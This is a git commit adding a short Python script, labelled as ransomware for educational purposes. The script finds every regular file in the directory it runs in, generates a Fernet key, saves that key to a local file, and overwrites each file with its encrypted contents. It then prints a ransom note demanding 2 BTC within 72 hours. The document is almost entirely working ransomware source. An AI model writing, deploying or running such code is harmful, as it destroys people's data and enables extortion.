28c04672d5bb023adb74aa5b6b91095032221915
Fahd Mohamed <164559895+Fahd-500@users.noreply.github.com>
2025-01-27 02:02:29 +0200

    Initial commit of ransomware for educational purposes

---
+++ ransomware/source.py
@@ -0,0 +1,28 @@
+import os
+from cryptography.fernet import Fernet
+
+# let's find these file
+
+files = []
+
+for file in os.listdir():
+    if file == "source.py" or file == "thekey.key" or file == "decrypt.py":
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+
+print(files)
+
+key = Fernet.generate_key()
+
+with open("thekey.key", "wb") as thekey:
+    thekey.write(key)
+
+for file in files:
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+    contents_encrypted = Fernet(key).encrypt(contents)
+    with open(file, "wb") as thefile:
+        thefile.write(contents_encrypted)
+
+print("All of your files have been encrypted.\nPay 2 BTC within 72 hours or all of your files will be permanently deleted.")
